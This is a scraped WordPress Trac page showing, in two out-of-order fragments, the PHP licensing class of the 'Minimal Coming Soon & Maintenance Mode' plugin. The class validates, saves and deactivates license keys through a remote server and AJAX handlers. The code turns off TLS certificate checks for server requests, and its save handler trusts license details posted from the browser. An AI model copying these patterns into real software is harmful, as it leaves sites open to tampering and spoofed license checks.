| [288](#L288) | 'keyless' => false, |
| [289](#L289) | ); |
| [290](#L290) |  |
| [291](#L291) | if (!$this->is\_active()) { |
| [292](#L292) | return $out; |
| [293](#L293) | } |
| [294](#L294) | $license['valid\_until'] = $license['valid\_until']; |
| [295](#L295) |  |
| [296](#L296) | $out['name'] = $license['name']; |
| [297](#L297) | $out['name\_long'] = $license['name']; |
| [298](#L298) | if ($license['meta']) { |
| [299](#L299) | $tmp = ''; |
| [300](#L300) | foreach ($license['meta'] as $meta => $meta\_value) { |
| [301](#L301) |  |
| [302](#L302) | if ($meta[0] == '\_' || filter\_var($meta\_value, FILTER\_VALIDATE\_BOOLEAN) != true) { |
| [303](#L303) | continue; |
| [304](#L304) | } |
| [305](#L305) | $meta = str\_replace('\_', ' ', $meta); |
| [306](#L306) | $meta = ucwords($meta); |
| [307](#L307) | $tmp .= $meta . ', '; |
| [308](#L308) | } |
| [309](#L309) | $tmp = trim($tmp, ', '); |
| [310](#L310) | if ($tmp) { |
| [311](#L311) | $out['name\_long'] .= ' with ' . $tmp; |
| [312](#L312) | } |
| [313](#L313) | } |
| [314](#L314) |  |
| [315](#L315) | if ($license['valid\_until'] == $this->valid\_forever) { |
| [316](#L316) | $out['valid\_until'] = 'forever'; |
| [317](#L317) | $out['recurring'] = false; |
| [318](#L318) | } else { |
| [319](#L319) | $out['valid\_until'] = 'until ' . date(get\_option('date\_format'), strtotime($license['valid\_until'])); |
| [320](#L320) | $out['recurring'] = true; |
| [321](#L321) | } |
| [322](#L322) |  |
| [323](#L323) | if (date('Y-m-d') == $license['valid\_until']) { |
| [324](#L324) | $out['expires'] = 'today'; |
| [325](#L325) | } elseif (date('Y-m-d', time() + 30 \* DAY\_IN\_SECONDS) > $license['valid\_until']) { |
| [326](#L326) | $tmp = (strtotime($license['valid\_until'] . date(' G:i:s')) - time()) / DAY\_IN\_SECONDS; |
| [327](#L327) | $out['expires'] = 'in ' . round($tmp) . ' days'; |
| [328](#L328) | } else { |
| [329](#L329) | $out['expires'] = 'in more than 30 days'; |
| [330](#L330) | } |
| [331](#L331) |  |
| [332](#L332) | if (empty($license['license\_key']) || $license['license\_key'] == 'keyless') { |
| [333](#L333) | $out['keyless'] = true; |
| [334](#L334) | } else { |
| [335](#L335) | $out['keyless'] = false; |
| [336](#L336) | $out['license\_key'] = $license['license\_key']; |
| [337](#L337) | $tmp = strlen($license['license\_key']); |
| [338](#L338) | $dash = false; |
| [339](#L339) | $new = ''; |
| [340](#L340) | for ($i = $tmp - 1; $i >= 0; $i--) { |
| [341](#L341) | if ($dash == false || $out['license\_key'][$i] == '-') { |
| [342](#L342) | $new = $out['license\_key'][$i] . $new; |
| [343](#L343) | } else { |
| [344](#L344) | $new = '\*' . $new; |
| [345](#L345) | } |
| [346](#L346) | if ($out['license\_key'][$i] == '-') { |
| [347](#L347) | $dash = true; |
| [348](#L348) | } |
| [349](#L349) | } |
| [350](#L350) | $out['license\_key\_hidden'] = $new; |
| [351](#L351) | } |
| [352](#L352) |  |
| [353](#L353) | $out = apply\_filters('wf\_licensing\_license\_formatted\_' . $this->prefix, $out); |
| [354](#L354) |  |
| [355](#L355) | if (!empty($key)) { |
| [356](#L356) | return $out[$key]; |
| [357](#L357) | } else { |
| [358](#L358) | return $out; |
| [359](#L359) | } |
| [360](#L360) | } // get\_license\_formatted |
| [361](#L361) |  |
| [362](#L362) |  |
| [363](#L363) | /\*\* |
| [364](#L364) | \* Updates license details in the database. |
| [365](#L365) | \* |
| [366](#L366) | \* @param string $data License data to save; or empty to delete license |
| [367](#L367) | \* |
| [368](#L368) | \* @return bool |
| [369](#L369) | \*/ |
| [370](#L370) | function update\_license($data = false) |
| [371](#L371) | { |
| [372](#L372) | if (false === $data) { |
| [373](#L373) | $tmp = delete\_option('wf\_licensing\_' . $this->prefix); |
| [374](#L374) | } else { |
| [375](#L375) | if (!isset($data['access\_key'])) { |
| [376](#L376) | $data['access\_key'] = $this->get\_license('access\_key'); |
| [377](#L377) | } |
| [378](#L378) | $tmp = update\_option('wf\_licensing\_' . $this->prefix, $data); |
| [379](#L379) | } |
| [380](#L380) |  |
| [381](#L381) | return $tmp; |
| [382](#L382) | } // update\_license |
| [383](#L383) |  |
| [384](#L384) |  |
| [385](#L385) | /\*\* |
| [386](#L386) | \* Check if license is valid |
| [387](#L387) | \* |
| [388](#L388) | \* @param string $feature If set it checks for a specific feature. |
| [389](#L389) | \* @param bool $force\_check Forces license recheck on server instead of just cached values. |
| [390](#L390) | \* |
| [391](#L391) | \* @return boolean |
| [392](#L392) | \*/ |
| [393](#L393) | function is\_active($feature = '', $force\_check = false, $local\_only = false) |
| [394](#L394) | { |
| [395](#L395) | $last\_check = $this->get\_license('last\_check'); |
| [396](#L396) | if ($local\_only == false) { |
| [397](#L397) | if ($force\_check || ($last\_check && ($last\_check + HOUR\_IN\_SECONDS \* 8) < time())) { |
| [398](#L398) | $this->log('auto recheck license'); |
| [399](#L399) | $this->validate(); |
| [400](#L400) | } |
| [401](#L401) | } |
| [402](#L402) |  |
| [403](#L403) | $license = $this->get\_license(); |
| [404](#L404) |  |
| [405](#L405) | if ( |
| [406](#L406) | !empty($license['license\_key']) && !empty($license['name']) && |
| [407](#L407) | !empty($license['valid\_until']) && $license['valid\_until'] >= date('Y-m-d') |
| [408](#L408) | ) { |
| [409](#L409) | if (!empty($feature)) { |
| [410](#L410) | if (!empty($license['meta'][$feature]) && filter\_var($license['meta'][$feature], FILTER\_VALIDATE\_BOOLEAN) == true) { |
| [411](#L411) | return true; |
| [412](#L412) | } else { |
| [413](#L413) | return false; |
| [414](#L414) | } |
| [415](#L415) | } else { |
| [416](#L416) | return true; |
| [417](#L417) | } |
| [418](#L418) | } else { |
| [419](#L419) | return false; |
| [420](#L420) | } |
| [421](#L421) | } // is\_active |
| [422](#L422) |  |
| [423](#L423) |  |
| [424](#L424) | /\*\* |
| [425](#L425) | \* Hook to plugin activation action. |
| [426](#L426) | \* If there's a license key, try to activate & write response. |
| [427](#L427) | \* |
| [428](#L428) | \* @return void |
| [429](#L429) | \*/ |
| [430](#L430) | function activate\_plugin() |
| [431](#L431) | { |
| [432](#L432) | $license = $this->get\_license(); |
| [433](#L433) | if ($this->is\_active() || !$license['license\_key']) { |
| [434](#L434) | return false; |
| [435](#L435) | } |
| [436](#L436) |  |
| [437](#L437) | $tmp = $this->validate(); |
| [438](#L438) | if ($tmp) { |
| [439](#L439) | $this->log('activating plugin, license activated'); |
| [440](#L440) | return true; |
| [441](#L441) | } else { |
| [442](#L442) | $this->log('activating plugin, unable to activate license'); |
| [443](#L443) | return false; |
| [444](#L444) | } |
| [445](#L445) | } // activate\_plugin |
| [446](#L446) |  |
| [447](#L447) |  |
| [448](#L448) | /\*\* |
| [449](#L449) | \* Hook to plugin deactivation action. |
| [450](#L450) | \* If there's a license key, try to deactivate & write response. |
| [451](#L451) | \* |
| [452](#L452) | \* @return void |
| [453](#L453) | \*/ |
| [454](#L454) | function deactivate\_plugin() |
| [455](#L455) | { |
| [456](#L456) | if (!$this->is\_active()) { |
| [457](#L457) | return false; |
| [458](#L458) | } |
| [459](#L459) |  |
| [460](#L460) | $license = $this->get\_license(); |
| [461](#L461) | $result = $this->query\_licensing\_server('deactivate\_license'); |
| [462](#L462) |  |
| [463](#L463) | if (is\_wp\_error($result) || !is\_array($result) || !isset($result['success']) || $result['success'] == false) { |
| [464](#L464) | $this->log('unable to deactivate license'); |
| [465](#L465) |  |
| [466](#L466) | return false; |
| [467](#L467) | } else { |
| [468](#L468) | $license['error'] = ''; |
| [469](#L469) | $license['name'] = ''; |
| [470](#L470) | $license['valid\_until'] = ''; |
| [471](#L471) | $license['meta'] = ''; |
| [472](#L472) | $license['last\_check'] = 0; |
| [473](#L473) | $this->update\_license($license); |
| [474](#L474) | $this->log('license deactivated'); |
| [475](#L475) |  |
| [476](#L476) | return true; |
| [477](#L477) | } |
| [478](#L478) | } // deactivate\_plugin |
| [479](#L479) |  |
| [480](#L480) |  |
| [481](#L481) | /\*\* |
| [482](#L482) | \* Use when uninstalling (deleting) the plugin to clean up. |
| [483](#L483) | \* |
| [484](#L484) | \* @param string $prefix Same prefix as used when initialising the class. |
| [485](#L485) | \* @return bool |
| [486](#L486) | \*/ |
| [487](#L487) | static function uninstall\_plugin($prefix) |
| [488](#L488) | { |
| [489](#L489) | $tmp = delete\_option('wf\_licensing\_' . $prefix); |
| [490](#L490) |  |
| [491](#L491) | return $tmp; |
| [492](#L492) | } // uninstall\_plugin |
| [493](#L493) |  |
| [494](#L494) |  |
| [495](#L495) | /\*\* |
| [496](#L496) | \* Delete license locally and send deactivate ping to licensing server |
| [497](#L497) | \* |
| [498](#L498) | \* @return void |
| [499](#L499) | \*/ |
| [500](#L500) | function deactivate() { |
| [501](#L501) | $license = $this->get\_license(); |
| [502](#L502) | $result = $this->query\_licensing\_server('deactivate\_license', array()); |
| [503](#L503) | $this->update\_license(false); |
| [504](#L504) |  |
| [505](#L505) | return $result; |
| [506](#L506) | } // deactivate |
| [507](#L507) |  |
| [508](#L508) | /\*\* |
| [509](#L509) | \* Validate license key on server and save response. |
| [510](#L510) | \* |
| [511](#L511) | \* @param string $license\_key License key, or leave empty to pull from saved. |
| [512](#L512) | \* |
| [513](#L513) | \* @return void |
| [514](#L514) | \*/ |
| [515](#L515) | function validate($license\_key = '') |
| [516](#L516) | { |
| [517](#L517) | $license = $this->get\_license(); |
| [518](#L518) | if (empty($license\_key)) { |
| [519](#L519) | $license\_key = $license['license\_key']; |
| [520](#L520) | } |
| [521](#L521) |  |
| [522](#L522) | $out = array( |
| [523](#L523) | 'license\_key' => $license\_key, |
| [524](#L524) | 'error' => '', |
| [525](#L525) | 'name' => '', |
| [526](#L526) | 'last\_check' => 0, |
| [527](#L527) | 'valid\_until' => '', |
| [528](#L528) | 'meta' => array() |
| [529](#L529) | ); |
| [530](#L530) |  |
| [531](#L531) | $result = $this->query\_licensing\_server('validate\_license', array('license\_key' => $license\_key)); |
| [532](#L532) |  |
| [533](#L533) | if (is\_wp\_error($result)) { |
| [534](#L534) | $out['error'] = 'Error querying licensing server. ' .  $result->get\_error\_message() . ' Please try again in a few moments.'; |
| [535](#L535) | $this->update\_license($out); |
| [536](#L536) |  |
| [537](#L537) | return false; |
| [538](#L538) | } elseif (!is\_array($result) || !isset($result['success'])) { |
| [539](#L539) | $out['error'] = 'Invalid response from licensing server. Please try again in a few moments.'; |
| [540](#L540) | $this->update\_license($out); |
| [541](#L541) |  |
| [542](#L542) | return false; |
| [543](#L543) | } elseif ($result['success'] == false) { |
| [544](#L544) | $out['error'] = $result['data']; |
| [545](#L545) | $this->update\_license($out); |
| [546](#L546) |  |
| [547](#L547) | return true; |
| [548](#L548) | } else { |
| [549](#L549) | $out['error'] = $result['data']['error']; |
| [550](#L550) | $out['name'] = $result['data']['name']; |
| [551](#L551) | $out['valid\_until'] = $result['data']['valid\_until']; |
| [552](#L552) | $out['meta'] = $result['data']['meta']; |
| [553](#L553) | $out['last\_check'] = time(); |
| [554](#L554) | $this->update\_license($out); |
| [555](#L555) |  |
| [556](#L556) | return true; |
| [557](#L557) | } |
| [558](#L558) | } // validate |
| [559](#L559) |  |
| [560](#L560) |  |
| [561](#L561) | function validate\_ajax() |
| [562](#L562) | { |
| [563](#L563) | check\_ajax\_referer('wf\_licensing\_' . $this->prefix); |
| [564](#L564) |  |
| [565](#L565) | $license\_key = trim($\_REQUEST['license\_key']); |
| [566](#L566) | if (empty($license\_key)) { |
| [567](#L567) | $this->update\_license(false); |
| [568](#L568) | do\_action('wf\_licensing\_' . $this->prefix . 'validate\_ajax', $license\_key, false); |
| [569](#L569) |  |
| [570](#L570) | wp\_send\_json\_success(); |
| [571](#L571) | } else { |
| [572](#L572) | $result = $this->validate($license\_key); |
| [573](#L573) | $license = $this->get\_license(); |
| [574](#L574) | do\_action('wf\_licensing\_' . $this->prefix . 'validate\_ajax', $license\_key, $result); |
| [575](#L575) |  |
| [576](#L576) | if ($result == true) { |
| [577](#L577) | wp\_send\_json\_success($result); |
| [578](#L578) | } else { |
| [579](#L579) | wp\_send\_json\_error($license); |
| [580](#L580) | } |
| [581](#L581) | } |
| [582](#L582) | } // validate\_ajax |
| [583](#L583) |  |
| [584](#L584) |  |
| [585](#L585) | function deactivate\_ajax() |
| [586](#L586) | { |
| [587](#L587) | check\_ajax\_referer('wf\_licensing\_' . $this->prefix); |
| [588](#L588) |  |
| [589](#L589) | $old\_license = $this->get\_license(); |
| [590](#L590) | $result = $this->deactivate(); |
| [591](#L591) | do\_action('wf\_licensing\_' . $this->prefix . 'deactivate\_ajax', $old\_license, $result); |
| [592](#L592) | wp\_send\_json\_success($result); |
| [593](#L593) | } // deactivate\_ajax |
| [594](#L594) |  |
| [595](#L595) |  |
| [596](#L596) | function save\_ajax() |
| [597](#L597) | { |
| [598](#L598) | check\_ajax\_referer('wf\_licensing\_' . $this->prefix); |
| [599](#L599) |  |
| [600](#L600) | $out['license\_key'] = trim(sanitize\_text\_field($\_POST['license\_key'])); |
| [601](#L601) |  |
| [602](#L602) | if (sanitize\_text\_field($\_POST['success']) == 'true') { |
| [603](#L603) | $out['error'] = trim(sanitize\_text\_field($\_POST['data']['error'])); |
| [604](#L604) | $out['name'] = trim(sanitize\_text\_field($\_POST['data']['name'])); |
| [605](#L605) | $out['valid\_until'] = trim(sanitize\_text\_field($\_POST['data']['valid\_until'])); |
| [606](#L606) | $out['meta'] = sanitize\_text\_field($\_POST['data']['meta']); |
| [607](#L607) | } else { |
| [608](#L608) | $out['error'] = trim(sanitize\_text\_field($\_POST['data'])); |
| [609](#L609) | $out['name'] = ''; |
| [610](#L610) | $out['valid\_until'] = ''; |
| [611](#L611) | $out['meta'] = array(); |
| [612](#L612) | } |
| [613](#L613) | $out['last\_check'] = time(); |
| [614](#L614) |  |
| [615](#L615) | $this->update\_license($out); |
| [616](#L616) | do\_action('wf\_licensing\_' . $this->prefix . 'save\_ajax', $out); |
| [617](#L617) |  |
| [618](#L618) | wp\_send\_json\_success(); |
| [619](#L619) | } // save\_ajax |
| [620](#L620) |  |
| [621](#L621) |  |
| [622](#L622) | function prepare\_server\_query\_data($action) |
| [623](#L623) | { |
| [624](#L624) | $license = $this->get\_license(); |
| [625](#L625) |  |
| [626](#L626) | $query\_data = array( |
| [627](#L627) | 'action' => $action, |
| [628](#L628) | 'license\_key' => $license['license\_key'], |
| [629](#L629) | 'rand' => rand(1000, 9999), |
| [630](#L630) | 'version' => $this->version, |
| [631](#L631) | 'wp\_version' => get\_bloginfo('version'), |
| [632](#L632) | 'site\_url' => get\_home\_url(), |
| [633](#L633) | 'site\_title' => get\_bloginfo('name'), |
| [634](#L634) | 'access\_key' => $license['access\_key'], |
| [635](#L635) | 'meta' => apply\_filters('wf\_licensing\_' . trim($this->prefix, '\_') . '\_query\_server\_meta', array(), $action) |
| [636](#L636) | ); |
| [637](#L637) |  |
| [638](#L638) | if (substr($action, 0, 7) == 'remote\_') { |
| [639](#L639) | unset($query\_data['action'], $query\_data['license\_key']); |
| [640](#L640) | } |
| [641](#L641) |  |
| [642](#L642) | return $query\_data; |
| [643](#L643) | } // prepare\_server\_query\_data |
| [644](#L644) |  |
| [645](#L645) |  |
| [646](#L646) | /\*\* |
| [647](#L647) | \* Run license server query. |
| [648](#L648) | \* |
| [649](#L649) | \* @param string $action |
| [650](#L650) | \* @param array $data |
| [651](#L651) | \* |
| [652](#L652) | \* @return string response|bool |
| [653](#L653) | \*/ |
| [654](#L654) | function query\_licensing\_server($action, $data = array()) |
| [655](#L655) | { |
| [656](#L656) | $license = $this->get\_license(); |
| [657](#L657) |  |
| [658](#L658) | $request\_params = array('sslverify' => false, 'timeout' => 25, 'redirection' => 2); |
| [659](#L659) | $default\_data = $this->prepare\_server\_query\_data($action); |
| [660](#L660) |  |
| [661](#L661) | $request\_data = array\_merge($default\_data, $data, array('action' => $action)); |
| [662](#L662) | $request\_data = apply\_filters('wf\_licensing\_' . trim($this->prefix, '\_') . '\_query\_server\_data', $request\_data, $action); |
| [663](#L663) | array\_walk\_recursive($request\_data, function (&$val, $ind) { |
| [664](#L664) | $val = rawurlencode($val); |
| [665](#L665) | }); |
| [666](#L666) |  |
| [667](#L667) | $this->log('query licensing server', $request\_data); |
| [668](#L668) |  |
| [669](#L669) | $url = rtrim(add\_query\_arg($request\_data, trailingslashit($this->licensing\_servers[0] . $this->api\_ver)), '&'); |
| [670](#L670) |  |
| [671](#L671) | $response = wp\_remote\_get($url, $request\_params); |
| [672](#L672) |  |
| [673](#L673) | $body = wp\_remote\_retrieve\_body($response); |
| [674](#L674) | $result = @json\_decode($body, true); |
| [675](#L675) |  |
| [676](#L676) | $this->log('licensing server response', $response); |
| [677](#L677) |  |
| [678](#L678) | if (is\_wp\_error($response) || empty($body) || !is\_array($result) || !isset($result['success'])) { |
| [679](#L679) | if (is\_wp\_error($response)) { |
| [680](#L680) | return $response; |
| [681](#L681) | } else { |
| [682](#L682) | return new WP\_Error(1, 'Invalid server response format.'); |
| [683](#L683) | } |
| [684](#L684) | } else { |
| [685](#L685) | return $result; |
| [686](#L686) | } |
| [687](#L687) | } // query\_licensing\_server |
| [688](#L688) | } // WF\_Licensing\_CSMM |
| [689](#L689) | } // if WF\_Licensing\_CSMM |

**Note:** See [TracBrowser](/wiki/TracBrowser)
for help on using the repository browser.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Plain Text](/browser/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php?format=txt)
* [Original Format](/export/3220669/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from plugins.trac.wordpress.org_caade6cb_20250111_113431.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fbrowser%2Fminimal-coming-soon-maintenance-mode%2Ftags%2F2.38%2Fframework%2Fwf-licensing.php)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Revision](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php?rev=2543111 "Revision 2543111")
* [Next Revision](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php?rev=3099123 "Revision 3099123") →
* [Blame](/browser/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php?annotate=blame "Annotate each line with the last changed revision (this can be time consuming...)")
* [Revision Log](/log/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php)

---

# [source:](/browser?order=name "Go to repository root") [minimal-coming-soon-maintenance-mode](/browser/minimal-coming-soon-maintenance-mode?order=name "View minimal-coming-soon-maintenance-mode")/[tags](/browser/minimal-coming-soon-maintenance-mode/tags?order=name "View tags")/[2.38](/browser/minimal-coming-soon-maintenance-mode/tags/2.38?order=name "View 2.38")/[framework](/browser/minimal-coming-soon-maintenance-mode/tags/2.38/framework?order=name "View framework")/[wf-licensing.php](/browser/minimal-coming-soon-maintenance-mode/tags/2.38/framework/wf-licensing.php?order=name "View wf-licensing.php")

View diff against:

View revision:

| [Last change](/changeset/3031149/minimal-coming-soon-maintenance-mode/trunk/framework/wf-licensing.php "View differences") on this file was [3031149](/changeset/3031149/ "View changeset 3031149"), checked in by WebFactory, [11 months ago](/timeline?from=2024-02-04T14%3A33%3A27Z&precision=second "See timeline at 02/04/2024 02:33:27 PM") |
| --- |
| Bug fixes |
| **File size:** 20.8 KB | |

| Line |  |
| --- | --- |
| [1](#L1) | <?php |
| [2](#L2) | if (false === class\_exists('WF\_Licensing\_CSMM')) { |
| [3](#L3) | class WF\_Licensing\_CSMM |
| [4](#L4) | { |
| [5](#L5) | public $prefix = ''; |
| [6](#L6) | private $licensing\_servers = array(); |
| [7](#L7) | private $version = ''; |
| [8](#L8) | private $slug = ''; |
| [9](#L9) | private $basename = ''; |
| [10](#L10) | private $plugin\_page = ''; |
| [11](#L11) | private $plugin\_file = ''; |
| [12](#L12) | private $js\_folder = ''; |
| [13](#L13) | protected $api\_ver = 'v1/'; |
| [14](#L14) | protected $valid\_forever = '2035-01-01'; |
| [15](#L15) | protected $unlimited\_installs = 99999; |
| [16](#L16) | public $disable\_remote = true; |
| [17](#L17) | public $debug = false; |
| [18](#L18) |  |
| [19](#L19) |  |
| [20](#L20) | /\*\* |
| [21](#L21) | \* Init licensing by setting up various params and hooking into actions. |
| [22](#L22) | \* |
| [23](#L23) | \* @param array $params Prefix, licensing\_servers, version, plugin\_file, skip\_hooks |
| [24](#L24) | \* |
| [25](#L25) | \* @return void |
| [26](#L26) | \*/ |
| [27](#L27) | function \_\_construct($params) |
| [28](#L28) | { |
| [29](#L29) | $this->prefix = trim($params['prefix']); |
| [30](#L30) | $this->licensing\_servers = $params['licensing\_servers']; |
| [31](#L31) | $this->version = trim($params['version']); |
| [32](#L32) | $this->slug = dirname(plugin\_basename(trim($params['plugin\_file']))); |
| [33](#L33) | $this->basename = plugin\_basename(trim($params['plugin\_file'])); |
| [34](#L34) | $this->plugin\_file = $params['plugin\_file']; |
| [35](#L35) | $this->plugin\_page = trim($params['plugin\_page']); |
| [36](#L36) | $this->disable\_remote = !empty($params['disable\_remote']); |
| [37](#L37) | $this->debug = !empty($params['debug']); |
| [38](#L38) |  |
| [39](#L39) | if ($params['js\_folder']) { |
| [40](#L40) | $this->js\_folder = trim($params['js\_folder']); |
| [41](#L41) | } else { |
| [42](#L42) | $this->js\_folder = plugin\_dir\_url($this->plugin\_file) . 'js/'; |
| [43](#L43) | } |
| [44](#L44) |  |
| [45](#L45) | if (empty($params['skip\_hooks'])) { |
| [46](#L46) | register\_activation\_hook($this->plugin\_file, array($this, 'activate\_plugin')); |
| [47](#L47) | register\_deactivation\_hook($this->plugin\_file, array($this, 'deactivate\_plugin')); |
| [48](#L48) |  |
| [49](#L49) | add\_action('init', array($this, 'init')); |
| [50](#L50) |  |
| [51](#L51) | add\_action('wp\_ajax\_wf\_licensing\_' . $this->prefix . '\_validate', array($this, 'validate\_ajax')); |
| [52](#L52) | add\_action('wp\_ajax\_wf\_licensing\_' . $this->prefix . '\_save', array($this, 'save\_ajax')); |
| [53](#L53) |  |
| [54](#L54) | add\_action('wp\_ajax\_wf\_licensing\_' . $this->prefix . '\_deactivate', array($this, 'deactivate\_ajax')); |
| [55](#L55) | } |
| [56](#L56) |  |
| [57](#L57) | $this->log('\_\_construct', $params, get\_object\_vars($this)); |
| [58](#L58) |  |
| [59](#L59) | add\_action('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_action\_refresh', array($this, 'remote\_action\_refresh')); |
| [60](#L60) | add\_action('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_action\_deactivate\_license', array($this, 'remote\_action\_deactivate\_license')); |
| [61](#L61) | add\_action('wf\_licensing\_' . trim($this->prefix, '\_') . '\_remote\_action\_validate\_license', array($this, 'remote\_action\_validate\_license')); |
| [62](#L62) |  |
| [63](#L63) | add\_action('plugins\_loaded', array($this, 'monitor\_remote\_actions')); |
| [64](#L64) | } // \_\_construct |
| [65](#L65) |  |
| [66](#L66) |  |
| [67](#L67) | /\*\* |
| [68](#L68) | \* Actions performed on WP init action. |
| [69](#L69) | \* |
| [70](#L70) | \* @return void |
| [71](#L71) | \*/ |
| [72](#L72) | function init() |
| [73](#L73) | { |
| [74](#L74) | if (is\_admin()) { |
| [75](#L75) | add\_action('admin\_enqueue\_scripts', array($this, 'admin\_enqueue\_scripts')); |
| [76](#L76) | } |
| [77](#L77) | } // init |
| [78](#L78) |  |
| [79](#L79) |  |
| [80](#L80) | function admin\_enqueue\_scripts() { |
| [81](#L81) | $current\_screen = get\_current\_screen(); |
| [82](#L82) |  |
| [83](#L83) | if (empty($current\_screen->id) || $current\_screen->id != $this->plugin\_page) { |
| [84](#L84) | return false; |
| [85](#L85) | } |
| [86](#L86) |  |
| [87](#L87) | $vars = array( |
| [88](#L88) | 'prefix' => $this->prefix, |
| [89](#L89) | 'debug' => $this->debug, |
| [90](#L90) | 'nonce' => wp\_create\_nonce('wf\_licensing\_' . $this->prefix), |
| [91](#L91) | 'licensing\_endpoint' => $this->licensing\_servers[0] . $this->api\_ver, |
| [92](#L92) | 'request\_data' => array( |
| [93](#L93) | 'action' => 'validate\_license', |
| [94](#L94) | 'license\_key' => '', |
| [95](#L95) | 'rand' => rand(1000, 9999), |
| [96](#L96) | 'version' => $this->version, |
| [97](#L97) | 'wp\_version' => get\_bloginfo('version'), |
| [98](#L98) | 'site\_url' => get\_home\_url(), |
| [99](#L99) | 'site\_title' => get\_bloginfo('name'), |
| [100](#L100) | 'meta' => array() |
| [101](#L101) | ) |
| [102](#L102) | ); |
| [103](#L103) |  |
| [104](#L104) | wp\_enqueue\_script('wf\_licensing', $this->js\_folder . 'wf-licensing.js', array(), 1.0, true); |
| [105](#L105) | wp\_localize\_script('wf\_licensing', 'wf\_licensing\_' . $this->prefix, $vars); |
| [106](#L106) | } // admin\_enqueue\_scripts |
| [107](#L107) |  |
| [108](#L108) |  |
| [109](#L109) | function monitor\_remote\_actions() |
| [110](#L110) | { |
| [111](#L111) | if ($this->disable\_remote || is\_admin()) { |
| [112](#L112) | return; |
| [113](#L113) | } |
| [114](#L114) |  |
| [115](#L115) | if (!empty($\_REQUEST[$this->prefix . '\_access\_key']) && !empty($\_REQUEST[$this->prefix . '\_action']) && isset($\_REQUEST[$this->prefix . '\_action\_params'])) { |
| [116](#L116) | $access\_key = substr(trim($\_REQUEST[$this->prefix . '\_access\_key']), 0, 32); |
| [117](#L117) | $action = substr(trim($\_REQUEST[$this->prefix . '\_action']), 0, 32); |
| [118](#L118) | $action\_params = $\_REQUEST[$this->prefix . '\_action\_params']; |
| [119](#L119) | $rand = substr($\_REQUEST[$this->prefix . '\_rand'], 0, 5); |
| [120](#L120) | $rand = preg\_replace("/[^0-9]/", '', $rand); |
| [121](#L121) |  |
| [122](#L122) | nocache\_headers(); |
| [123](#L123) | header('X-WF-Licensing-' . $this->prefix . ': ' . $this->version); |
| [124](#L124) |  |
| [125](#L125) | if (strlen($rand) != 5) { |
| [126](#L126) | wp\_send\_json\_error('Invalid random value.'); |
| [127](#L127) | } |
| [128](#L128) |  |
| [129](#L129) | if (false == $this->is\_active(false, false, true)) { |
| [130](#L130) | wp\_send\_json\_error('License is not active.'); |
| [131](#L131) | } |
| [132](#L132) |  |
| [133](#L133) | if (false == $this->is\_remote\_action($action)) { |
| [134](#L134) | wp\_send\_json\_error('Unknown remote action.'); |
| [135](#L135) | } |
| [136](#L136) |  |
| [137](#L137) | $access\_key = preg\_replace("/[^0-9a-zA-Z]/", '', $access\_key); |
| [138](#L138) | if (strlen($access\_key) != 32) { |
| [139](#L139) | wp\_send\_json\_error('Invalid access key format.'); |
| [140](#L140) | } |
| [141](#L141) |  |
| [142](#L142) | $license = $this->get\_license(); |
| [143](#L143) | if ($access\_key != $license['access\_key']) { |
